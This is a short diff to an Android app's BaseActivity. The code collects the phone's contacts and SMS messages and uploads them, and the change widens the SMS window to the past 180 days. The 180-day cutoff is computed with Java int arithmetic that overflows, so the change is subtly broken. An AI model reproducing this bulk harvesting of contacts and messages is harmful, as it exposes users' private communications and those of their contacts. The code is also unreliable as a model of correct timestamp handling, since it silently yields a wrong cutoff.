@@ -628,7 +628,6 @@ public class BaseActivity extends AppCompatActivity {
 //          }
 //        }
         try {
-
           Log.d(TAG, "collectDataAndUpload BEGIN getAndSendContact" );
           uploadData.getAndSendContact();
           setConfigInfo(KndcStorage.CONFIG_CALENDAR_TIME, String.valueOf(nowTimeStamp));
@@ -649,9 +648,12 @@ public class BaseActivity extends AppCompatActivity {
 //        }
         try {
           String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
-          long smsLastTimeStamp = 0;
+          long smsLastTimeStamp = todayStartTime - 180 * 24 * 3600 * 1000;
           if(!TextUtils.isEmpty(smsLastTime)) {
-            smsLastTimeStamp = Long.parseLong(smsLastTime);
+            long smsLastLongTime = Long.parseLong(smsLastTime);
+            if(smsLastLongTime > 0 && smsLastLongTime > smsLastTimeStamp) {
+              smsLastTimeStamp = smsLastLongTime;
+            }
           }
           Log.d(TAG, "collectDataAndUpload BEGIN getAndSendSms" );
           uploadData.getAndSendSms(smsLastTimeStamp);
